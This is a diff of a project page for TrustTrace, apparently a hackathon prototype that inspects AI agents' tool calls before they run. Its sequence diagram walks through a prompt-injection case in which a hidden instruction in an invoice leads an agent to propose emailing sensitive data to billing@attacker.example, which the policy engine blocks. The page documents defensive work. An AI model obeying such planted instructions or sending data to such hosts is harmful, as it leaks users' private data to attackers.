@@ -14,29 +14,95 @@ h1{font-size:clamp(2rem,6vw,3.2rem);line-height:1.1;margin:.2em 0}h2{margin-top:
 .n{font-size:2rem;font-weight:700;color:var(--acc)}
 table{width:100%;border-collapse:collapse}td,th{padding:8px;border-bottom:1px solid #8884;text-align:left}
 .ALLOW{color:var(--ok)}.REVIEW{color:var(--rev)}.BLOCK{color:var(--bad)}
-pre{background:var(--card);padding:16px;border-radius:12px;overflow:auto}a{color:var(--acc)}
+pre.mermaid{background:transparent;text-align:center;padding:0}pre{background:var(--card);padding:16px;border-radius:12px;overflow:auto}a{color:var(--acc)}
 </style></head><body><main>
 <p class="mut">AI Agent Firewall &amp; Auditor</p>
 <h1>This invoice just told your agent to email payroll.</h1>
 <p>TrustTrace inspects every proposed tool call, and the untrusted sources behind it, <em>before</em> it runs. Each verdict goes into a signed, tamper-evident ledger.</p>
-<p><a href="https://github.com/Haseebi-khan/TrustTrace-AI">Source on GitHub</a> · <a href="https://github.com/Haseebi-khan/TrustTrace-AI#readme">README</a> · <a href="https://github.com/Haseebi-khan/TrustTrace-AI/blob/main/PITCH.md">Pitch outline</a></p>
+<p><a href="https://github.com/Haseebi-khan/TrustTrace-AI">Source on GitHub</a> · <a href="https://github.com/Haseebi-khan/TrustTrace-AI#readme">README</a> · <a href="presentation.pdf">Presentation (PDF)</a></p>
 
 <img src="dashboard.png" alt="TrustTrace dashboard" style="width:100%;border-radius:12px;margin-top:16px">
 
 <h2>Results</h2>
 <div class="grid">
-<div class="card"><div class="n">5/5</div>attacks stopped</div>
+<div class="card"><div class="n">5/5</div>attacks flagged (BLOCK/REVIEW)</div>
 <div class="card"><div class="n">0/3</div>benign calls blocked</div>
 <div class="card"><div class="n">~1 ms</div>p50 policy latency</div>
 <div class="card"><div class="n">8</div>deterministic scenarios</div></div>
+<p class="mut">A REVIEW flags a call for human attention; it is not a block. Results are from team-authored regression scenarios, not a general security efficacy claim.</p>
 
-<h2>How it works</h2>
-<pre>agent → proposed tool call (+ context sources)
-      → L0 strict schema
-      → L1/L2 policy engine (YAML)
-      → L3 Gemini judge (optional, can only tighten)
-      → ALLOW | REVIEW | BLOCK
-      → signed ledger (SHA-256 chain + Ed25519)</pre>
+<h2>Architecture</h2>
+<div class="card"><pre class="mermaid">flowchart TB
+  user([&quot;User or agent developer&quot;])
+  src[(&quot;Untrusted sources&lt;br/&gt;invoices, tickets, web pages&quot;)]
+
+  subgraph AGENT[&quot;AI agent · any LLM&quot;]
+    llm[&quot;LLM plans a tool call&quot;]
+  end
+
+  subgraph TT[&quot;TrustTrace API · FastAPI · local&quot;]
+    direction TB
+    schema[&quot;L0 strict schema&lt;br/&gt;5 tools, extra fields rejected&quot;]
+    policy[&quot;L1/L2 policy engine&lt;br/&gt;domains, sensitive data, SQL,&lt;br/&gt;CRM bulk, path traversal,&lt;br/&gt;injection in context&lt;br/&gt;rules.yaml&quot;]
+    judge{{&quot;L3 Gemini judge · optional&lt;br/&gt;can only tighten a verdict&lt;br/&gt;failure blocks&quot;}}
+    decide{&quot;Risk score&lt;br/&gt;under 0.4 · 0.4 to 0.7 · 0.7 or more&quot;}
+    schema --&gt; policy --&gt; judge --&gt; decide
+  end
+
+  subgraph OUT[&quot;Outcomes&quot;]
+    allow[&quot;ALLOW&lt;br/&gt;sandbox mock tool only&quot;]
+    review[&quot;REVIEW&lt;br/&gt;held for a human&quot;]
+    block[&quot;BLOCK&lt;br/&gt;never executed&quot;]
+  end
+
+  ledger[(&quot;Signed audit ledger&lt;br/&gt;SQLite · SHA-256 chain · Ed25519&quot;)]
+  dash[&quot;Dashboard · Next.js&lt;br/&gt;trace, verify chain, export JSON&quot;]
+
+  user --&gt; llm
+  src -. &quot;poisoned text&quot; .-&gt; llm
+  llm -- &quot;proposed call + context sources&quot; --&gt; schema
+  decide --&gt; allow
+  decide --&gt; review
+  decide --&gt; block
+  decide -- &quot;every verdict&quot; --&gt; ledger
+  ledger --&gt; dash</pre></div>
+
+<h2>One attack, step by step</h2>
+<p class="mut">The invoice-exfiltration scenario, from the user's request to the signed ledger entry.</p>
+<div class="card"><pre class="mermaid">sequenceDiagram
+  autonumber
+  actor User
+  participant Agent as AI agent
+  participant API as TrustTrace API
+  participant Pol as Policy engine
+  participant Jdg as Gemini judge (optional)
+  participant Led as Signed ledger
+  participant Tool as Sandbox mock tool
+  participant Dash as Dashboard
+
+  User-&gt;&gt;Agent: &quot;Summarize this vendor invoice&quot;
+  Agent-&gt;&gt;Agent: reads invoice_4471.pdf (hidden instruction)
+  Agent-&gt;&gt;API: POST /v1/execute send_email billing@attacker.example
+  API-&gt;&gt;Pol: validate strict schema, then run rules
+  Pol--&gt;&gt;API: BLOCK risk 1.0 sensitive_data, unapproved_destination, exfiltration, untrusted_context_instruction
+  Note over API,Jdg: Deterministic BLOCK short-circuits. The judge is never asked and cannot override.
+  API-&gt;&gt;Led: append event, hash-chain it, sign with Ed25519
+  API--xTool: not executed
+  API--&gt;&gt;Agent: BLOCK plus findings and source invoice_4471.pdf
+  Dash-&gt;&gt;Led: GET /v1/audit/verify
+  Led--&gt;&gt;Dash: chain valid, signatures valid
+  User-&gt;&gt;Dash: Export JSON evidence report</pre></div>
+
+<h2>Tamper-evident ledger</h2>
+<div class="card"><pre class="mermaid">flowchart LR
+  e1[&quot;Event 1&lt;br/&gt;payload&lt;br/&gt;hash = SHA-256(payload + genesis)&quot;] --&gt; e2[&quot;Event 2&lt;br/&gt;payload&lt;br/&gt;hash = SHA-256(payload + hash 1)&quot;] --&gt; e3[&quot;Event 3&lt;br/&gt;payload&lt;br/&gt;hash = SHA-256(payload + hash 2)&quot;]
+  key([&quot;Ed25519 private key&lt;br/&gt;stays local&quot;]) -. &quot;signs each hash&quot; .-&gt; e1
+  key -.-&gt; e2
+  key -.-&gt; e3
+  verify{{&quot;Verify chain&lt;br/&gt;recompute hashes + check signatures&quot;}}
+  e3 --&gt; verify
+  verify --&gt; ok[&quot;Valid&quot;]
+  verify --&gt; bad[&quot;Edit any event → chain breaks&quot;]</pre></div>
 
 <h2>Benchmark vs keyword filter</h2>
 <table><tr><th></th><th>Attacks caught</th><th>Exact decision</th><th>False positives</th></tr>
@@ -60,4 +126,9 @@ pre{background:var(--card);padding:16px;border-radius:12px;overflow:auto}a{color
 <h2>Honest limits</h2>
 <p>Prototype with synthetic data and sandbox mocks only. Heuristic checks can be evaded or over-trigger. Reports are evidence aligned with SOC 2 / AIUC-1 concepts, not a certification. NeMo Guardrails is not implemented.</p>
 <p class="mut">Team: Haseeb Khan, Abu Baker, Luqman Khan.</p>
-</main></body></html>
+</main>
+<script type="module">
+import mermaid from "https://cdn.jsdelivr.net/npm/mermaid@11.4.0/dist/mermaid.esm.min.mjs";
+const dark = matchMedia("(prefers-color-scheme: dark)").matches;
+mermaid.initialize({startOnLoad:true,theme:dark?"dark":"default",securityLevel:"strict"});
+</script></body></html>
